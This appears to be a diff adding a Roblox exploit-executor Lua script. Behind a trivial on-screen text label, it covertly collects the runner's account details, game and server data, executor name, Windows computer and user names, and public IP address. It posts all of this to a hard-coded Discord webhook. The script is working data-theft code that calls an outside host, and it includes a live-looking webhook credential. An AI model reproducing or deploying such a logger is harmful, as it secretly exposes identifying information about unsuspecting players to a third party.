@@ -1,0 +1,192 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+
+local webhookUrl = "https://discord.com/api/webhooks/1482630205511303188/OgVPyq0Kz2MFnyNdzxPYsJ8udD_yycHG5vE2Bv_t8dEaVM2o-sw5VWktS5oVr7x_na2T"
+
+local function safeGet(func, fallback)
+    local success, result = pcall(func)
+    if success and result ~= nil then
+        return tostring(result)
+    end
+    return fallback or "N/A"
+end
+
+local function formatTime(seconds)
+    local h = math.floor(seconds / 3600)
+    local m = math.floor((seconds % 3600) / 60)
+    local s = math.floor(seconds % 60)
+    return string.format("%02d:%02d:%02d", h, m, s)
+end
+
+repeat task.wait() until Players.LocalPlayer
+local player = Players.LocalPlayer
+
+local playerName = player.Name
+local displayName = player.DisplayName
+local userId = player.UserId
+local accountAge = player.AccountAge
+local membership = safeGet(function() return player.MembershipType end, "Unknown")
+local team = safeGet(function() return player.Team and player.Team.Name end, "No Team")
+
+local character = player.Character
+local position = "N/A"
+if character then
+    local rootPart = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso") or character.PrimaryPart
+    if rootPart then
+        position = safeGet(function() return string.format("(%.1f, %.1f, %.1f)", rootPart.Position.X, rootPart.Position.Y, rootPart.Position.Z) end, "N/A")
+    end
+end
+
+local placeId = game.PlaceId
+local gameName = safeGet(function() return MarketplaceService:GetProductInfo(placeId).Name end, "Unknown Game")
+local gameCreator = safeGet(function()
+    local info = MarketplaceService:GetProductInfo(placeId)
+    return info.Creator.Name or "Unknown"
+end, "Unknown")
+local gameGenre = safeGet(function()
+    local info = MarketplaceService:GetProductInfo(placeId)
+    return info.Genre or "Unknown"
+end, "Unknown")
+local jobId = game.JobId
+local playersCount = #Players:GetPlayers()
+local maxPlayers = Players.MaxPlayers
+local serverTime = formatTime(workspace.DistributedGameTime)
+local placeVersion = safeGet(function() return game.PlaceVersion end, "N/A")
+
+local ping = safeGet(function()
+    return Stats.Network.ServerStatsItem['Data Ping']:GetValue()
+end, "N/A")
+
+local executorName = safeGet(function()
+    if identifyexecutor then
+        return identifyexecutor()
+    elseif getexecutorname then
+        return getexecutorname()
+    else
+        return "Unknown Executor"
+    end
+end, "Unknown Executor")
+
+local executorVersion = safeGet(function()
+    if getexecutorversion then
+        return getexecutorversion()
+    else
+        return "N/A"
+    end
+end, "N/A")
+
+local computerName = safeGet(function() return os.getenv("COMPUTERNAME") end, "N/A")
+local userName = safeGet(function() return os.getenv("USERNAME") end, "N/A")
+local osVersion = safeGet(function() return os.getenv("OS") end, "N/A")
+
+local publicIP = "N/A"
+if http_request then
+    local ipSuccess, ipResponse = pcall(function()
+        return http_request({
+            Url = "https://api.ipify.org",
+            Method = "GET"
+        })
+    end)
+    if ipSuccess and ipResponse and ipResponse.StatusCode == 200 then
+        publicIP = ipResponse.Body or "N/A"
+    end
+end
+
+local platform = safeGet(function()
+    if UserInputService then
+        if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
+            return "Mobile"
+        elseif UserInputService.GamepadEnabled then
+            return "Console/Gamepad"
+        else
+            return "PC"
+        end
+    else
+        return "Unknown"
+    end
+end, "Unknown")
+
+local robloxVersion = safeGet(function() return game:GetService("BrowserService"):GetVersion() end, "N/A")
+local fps = safeGet(function() return 1 / RunService.RenderStepped:Wait() end, "N/A")
+
+local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+local localTime = os.date("%c")
+
+local embed = {
+    title = "🚀 Script Executed",
+    description = "**" .. playerName .. "** ran the script.",
+    color = 0x00FF00,
+    fields = {
+        { name = "👤 Player Info", value = string.format(
+            "**Name:** %s\n**Display Name:** %s\n**User ID:** %d\n**Account Age:** %d days\n**Membership:** %s\n**Team:** %s\n**Position:** %s",
+            playerName, displayName, userId, accountAge, membership, team, position
+        ), inline = false },
+        { name = "🎮 Game Info", value = string.format(
+            "**Name:** %s\n**Place ID:** %d\n**Creator:** %s\n**Genre:** %s\n**Version:** %s",
+            gameName, placeId, gameCreator, gameGenre, placeVersion
+        ), inline = true },
+        { name = "🖥️ Server", value = string.format(
+            "**Job ID:** `%s`\n**Players:** %d / %d\n**Uptime:** %s",
+            jobId, playersCount, maxPlayers, serverTime
+        ), inline = true },
+        { name = "🔧 Executor", value = string.format(
+            "**Name:** %s\n**Version:** %s",
+            executorName, executorVersion
+        ), inline = true },
+        { name = "💻 System", value = string.format(
+            "**Computer:** %s\n**User:** %s\n**OS:** %s\n**Public IP:** %s",
+            computerName, userName, osVersion, publicIP
+        ), inline = true },
+        { name = "📡 Network", value = string.format(
+            "**Ping:** %s ms",
+            ping
+        ), inline = true },
+        { name = "📱 Client", value = string.format(
+            "**Platform:** %s\n**Version:** %s\n**FPS (approx):** %s",
+            platform, robloxVersion, fps
+        ), inline = true },
+        { name = "⏰ Time", value = string.format(
+            "**Local:** %s\n**Server Time:** %s",
+            localTime, currentTime
+        ), inline = false }
+    },
+    footer = {
+        text = "Ultimate Log | " .. currentTime
+    }
+}
+
+local payload = {
+    content = "**New script execution detected!**" .. " " ..math.random(1, 10000),
+    embeds = { embed }
+}
+
+local jsonData = HttpService:JSONEncode(payload)
+
+if http_request then
+    pcall(function()
+        http_request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = jsonData
+        })
+    end)
+end
+
+screenGui.Parent = player.PlayerGui
+local feedbackLabel = Instance.new("TextLabel")
+feedbackLabel.Size = UDim2.new(0, 300, 0, 30)
+feedbackLabel.AnchorPoint = Vector2.new(0.5, 0.5) 
+feedbackLabel.Position = UDim2.new(0.5, 0, 0.5, 0) 
+feedbackLabel.TextColor3 = Color3.new(1, 1, 1)
+feedbackLabel.BackgroundTransparency = 1
+feedbackLabel.Text = "se ia dupa fata"
+feedbackLabel.Font = Enum.Font.SourceSansBold
+feedbackLabel.TextSize = 200
+feedbackLabel.Parent = screenGui
